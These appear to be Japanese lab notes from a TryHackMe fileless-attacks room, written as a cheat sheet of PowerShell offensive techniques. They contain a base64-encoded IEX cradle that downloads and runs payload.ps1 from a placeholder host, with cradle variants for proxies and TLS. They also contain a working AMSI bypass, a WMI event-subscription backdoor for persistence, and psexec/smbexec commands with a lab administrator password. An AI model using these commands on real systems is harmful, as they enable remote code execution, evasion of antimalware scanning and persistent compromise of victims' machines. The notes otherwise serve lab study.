### IEX

```ps

```

### -EncodedCommand

```sh
python3 -c "import base64; print(base64.b64encode('IEX(New-Object Net.WebClient).DownloadString(\'http://CONNECTION_IP:8000/payload.ps1\')'.encode('utf-16-le')).decode())"

powershell.exe -EncodedCommand SQBFAFgAKABOAGU......
```

| Variant     | 構文                                                                                                                                                                      | 備考                                                                                                                                                        |
| ----------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Classic     | `IEX(New-Object Net.WebClient).DownloadString('...')`                                                                                                                   | 広く知られている手法で、監視・検知の対象になりやすい                                                                                                                              |
| IWR         | `IEX((IWR 'http://...' -UseBasicParsing).Content)`                                                                                                                      | `Invoke-WebRequest` を使用する。Internet Explorer が初期化されていない **Windows Server 2019** では `-UseBasicParsing` が必要。`.Content` はテキスト形式のレスポンスに対して **String** を返す |
| HTTPS fix   | `[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12` をクレードルの前に実行                                                                           | 古い .NET バージョンで HTTPS を使用する場合に必要                                                                                                                         |
| Proxy-aware | `$c=New-Object Net.WebClient; $c.Proxy=[Net.WebRequest]::GetSystemWebProxy(); $c.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $c.DownloadString('...')` | HTTP プロキシが必須となっている環境に対応するための方法                                                                                                                          |

## AMSI バイパス

```sh
echo 'U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM=' | base64 -d
System.Management.Automation.AmsiUtils
```

```ps
# 実行時にクラス名をデコードする
$b = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))

# ロードされたアセンブリを通してクラスを探す
$t = [AppDomain]::CurrentDomain.GetAssemblies() | ? {$_.FullName -like '*Automation*'} | % {$_.GetType($b)} | ? {$_}

# amsiInitFailed フィールドを見つけて反転させる
$t.GetFields(40) | ? {$_.FieldType -eq [bool]} | % {$_.SetValue($null,$true)}
```

### イベントサブスクリプション（永続性）

```ps
# オブジェクトを作成
$filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="BackdoorTrigger";EventNamespace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 60"}

$consumer = Set-WmiInstance -Namespace root\subscription -Class ActiveScriptEventConsumer -Arguments @{Name="BackdoorConsumer";ScriptingEngine="VBScript";ScriptText='Set shell = CreateObject("WScript.Shell"): shell.Run "powershell -NoP -Command ""[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(''VEhNe3dtMV9wM3JzMXN0M25jM30='')) | Out-File -FilePath C:\Windows\Temp\wmi_flag.txt -Encoding ascii""",0,False'}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter;Consumer=$consumer}

# 作成したサブスクリプションを確認
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding
```

削除

```ps
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like '*BackdoorTrigger*'} | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class ActiveScriptEventConsumer | Where-Object {$_.Name -eq 'BackdoorConsumer'} | Remove-WmiObject; Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object {$_.Name -eq 'BackdoorTrigger'} | Remove-WmiObject
```

## smbexec

[Task7](https://tryhackme.com/room/filelessattacks) 参照。  
psexec と動作が非常に似ているが、smbexec はファイルレス。  
psexec は \\TARGET\$ADMIN にバイナリファイルをドロップする。smbexec はバイナリとして cmd.exe を使う。


```sh
psexec.py 'Administrator:fileless007@10.145.130.16'

smbexec.py 'Administrator:fileless007@10.145.130.16'
```
